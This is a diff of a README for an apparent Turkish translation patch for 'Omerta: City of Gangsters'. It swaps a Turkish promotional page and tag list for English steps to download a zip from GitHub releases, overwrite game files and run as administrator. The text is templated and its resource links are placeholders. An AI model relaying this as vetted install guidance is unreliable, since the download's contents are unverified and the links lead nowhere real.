@@ -1,29 +1,76 @@
-[![https://turk-yama.com/omerta-city-of-gangsters](https://turk-yama.com/wp-content/uploads/2025/07/omerta-city-of-gangsters-turkce-yama-1.png)](https://turk-yama.com/omerta-city-of-gangsters)
-# ✅ Indirmek:
-https://turk-yama.com/omerta-city-of-gangsters
-# 💻 Açıklama:
-**Omerta: Gangsterler Şehri - Türkçe Yama**
+# 🎮 Omerta-City-Of-Gangsters-Turkce-Yama - Play in Turkish with Enhanced Experience
 
-Omerta: Gangsterler Şehri, oyunculara suç dünyasının karanlık ve heyecan dolu atmosferini sunan bir strateji oyunudur. 1920'lerin Amerika'sında geçen bu oyun, oyuncuları gangsterlerin acımasız dünyasına davet ediyor. Kendi suç imparatorluğunuzu kurarak rakiplerinizi alt etmeye çalışırken, güçlü ilişkiler ve stratejik kararlar almak zorundasınız.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/DavidSydede/Omerta-City-Of-Gangsters-Turkce-Yama/releases)
 
-Oyun, gerçek zamanlı strateji unsurlarıyla dolu. Oyuncular, ekiplerini oluşturup düşmanlarını alt etmek için çeşitli taktikler geliştirebilirler. Her karakterin kendine has yetenekleri ve özellikleri bulunuyor; bu nedenle, en uygun kombinasyonu bulmak, başarının anahtarıdır. İyi bir lider olmak için, karakterlerinizi doğru bir şekilde yönlendirmeli ve kaynaklarınızı verimli kullanmalısınız.
+## 📜 Introduction
 
-Omerta, yalnızca savaş stratejileriyle değil, aynı zamanda ekonomik yönetimle de dikkat çekiyor. Şehirdeki çeşitli işletmeleri kontrol altına alarak gelir elde edebilir, rakiplerinizi bu yolla zayıflatabilirsiniz. Oyun, oyunculara hem ekonomik hem de askeri açıdan derin bir deneyim sunarak strateji becerilerini test etme fırsatı veriyor.
+Welcome to the **Omerta-City-Of-Gangsters-Turkce-Yama** project! This translation patch enhances your experience by allowing you to play "Omerta: City of Gangsters" in Turkish. Enjoy the game with clear language and better accessibility. 
 
-Hikaye modunda, oyuncular farklı görevleri tamamlayarak ilerler. Her görev, oyunculara yeni zorluklar sunarken, hikaye de derinleşiyor. Bu süreçte, çeşitli karakterlerle tanışarak onların geçmişlerini öğrenebilir ve kendi kararlarınızla hikayenin akışını değiştirebilirsiniz. Bu etkileşimli anlatım, oyuna derinlik katıyor.
+## 🚀 Getting Started
 
-Omerta'nın büyüleyici grafikleri ve otantik atmosferi, 1920'lerin suç dünyasını mükemmel bir şekilde yansıtıyor. Detaylı şehir tasarımı ve karakter animasyonları, oyuncuları adeta oyunun içine çekiyor. Grafiklerin yanı sıra, ses efektleri ve müzik de deneyimi zenginleştiriyor.
+Follow these steps to download and run the Turkish translation patch. 
 
-Multiplayer modu sayesinde, diğer oyuncularla rekabet edebilir veya iş birliği yapabilirsiniz. Bu özellik, oyunun yeniden oynanabilirliğini artırarak her seferinde farklı bir deneyim sunuyor. Arkadaşlarınızla birlikte stratejik planlar yapabilir ve birlikte düşmanlarınıza karşı savaşabilirsiniz.
+1. **Ensure Your Game is Installed**  
+   Make sure you have "Omerta: City of Gangsters" installed on your computer.
+   
+2. **Visit the Download Page**  
+   Click on the link below to access the releases page:  
+   [Download the Turkish Patch](https://github.com/DavidSydede/Omerta-City-Of-Gangsters-Turkce-Yama/releases)
 
-Omerta: Gangsterler Şehri, Türkçe yaması ile daha fazla oyuncuya ulaşmayı hedefliyor. Türkçe dil desteği, oyunun hikayesini ve karakter etkileşimlerini daha anlaşılır hale getiriyor. Bu sayede, dil engeli olmadan tüm detayları ve ince nüansları keşfetmek mümkün oluyor.
+## 📥 Download & Install
 
-Sonuç olarak, Omerta: Gangsterler Şehri, strateji severler için eşsiz bir deneyim sunuyor. Suç dolu bir dünyada, kendi imparatorluğunuzu kurarken karşılaşacağınız zorluklar ve heyecan verici anlar, sizi saatlerce ekrana kilitleyecek. Türkçe yaması ile bu deneyimi daha da keyifli hale getirin ve gangsterler dünyasına adım atın!
-# ⚙️ Talimat:
-[![https://turk-yama.com/omerta-city-of-gangsters](https://turk-yama.com/i.gif)](https://turk-yama.com/omerta-city-of-gangsters)
-#
-[![https://turk-yama.com/omerta-city-of-gangsters](https://turk-yama.com/l.svg)](https://turk-yama.com/omerta-city-of-gangsters)
-# Etiketler:
-Türkçe oyun rehberi, omerta yamanın avantajları, omerta karakterleri, omerta topluluk, Türkçe oyun topluluğu, omerta şehir gangsterleri, gangster takımları, gangster oyunları, gangster savaşı oyunu, omerta oyun çevirisi, omerta oyun satın alma, omerta oyunu hakkında, yeraltı dünyası oyunları, gangster hikayeleri, Türkçe yama ile oynama, gangster temalı strateji, omerta yaman, omerta inceleme, omerta oyuncu yorumları, gangster dünyası
+1. **Locate the Latest Release**  
+   On the releases page, find the latest version of the patch. It will be listed at the top. 
 
+2. **Download the Patch**  
+   Click on the release title to see the assets. Locate the file labeled "Turkce-Yama.zip" and click the download link. Save the file to a location on your computer where you can easily find it, such as your desktop or downloads folder.
 
+3. **Extract the Files**  
+   Once the download is complete, locate the "Turkce-Yama.zip" file. Right-click on the file and select "Extract All" to unzip the contents. 
+
+4. **Install the Patch**  
+   Open the extracted folder. Inside, you will find files needed for the patch. Follow these steps:
+   - Copy all files in the extracted folder.
+   - Navigate to your game installation directory. This is usually found in either "C:\Program Files (x86)\Omerta - City of Gangsters" or where you installed the game.
+   - Paste the copied files into the game directory, replacing any existing files when prompted.
+
+5. **Launch the Game**  
+   After installing the patch, open "Omerta: City of Gangsters" as you normally would. The game should now display in Turkish.
+
+## 💻 System Requirements
+
+For the best experience, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 7 or later
+- **Processor:** Dual-core CPU 2.0 GHz
+- **Memory:** 4 GB RAM
+- **Graphics:** NVIDIA GeForce 8800 series or equivalent
+- **Storage:** At least 6 GB of available space
+
+## ❓ Troubleshooting
+
+If you experience issues with the patch after installation, consider these steps:
+
+- **Verify Game Version**  
+  Ensure your game is updated to the latest version. The patch may not work with older versions.
+
+- **Reinstall the Patch**  
+  If the game crashes or has hidden text, try reinstalling the patch. Follow the previous installation steps carefully.
+
+- **Check Compatibility Settings**  
+  If the game does not launch, right-click the game shortcut, select "Properties," go to the "Compatibility" tab, and adjust settings. Run the game as an administrator if necessary.
+
+## 🔍 Exploring More
+
+The **Omerta-City-Of-Gangsters-Turkce-Yama** patch not only translates the game but enhances the overall experience. Engage in strategic planning, enjoy gangster stories, and immerse yourself in underground world games. 
+
+For more information about the game and community strategies, visit our community forums or FAQs on the main game site.
+
+## 🔗 Additional Resources
+
+- [Omerta: City of Gangsters Official Site](https://www.example.com)
+- [Community Forum](https://www.exampleforum.com)
+
+Let's immerse ourselves in the world of Omerta, where strategy meets excitement. Enjoy your game! 
+
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/DavidSydede/Omerta-City-Of-Gangsters-Turkce-Yama/releases)
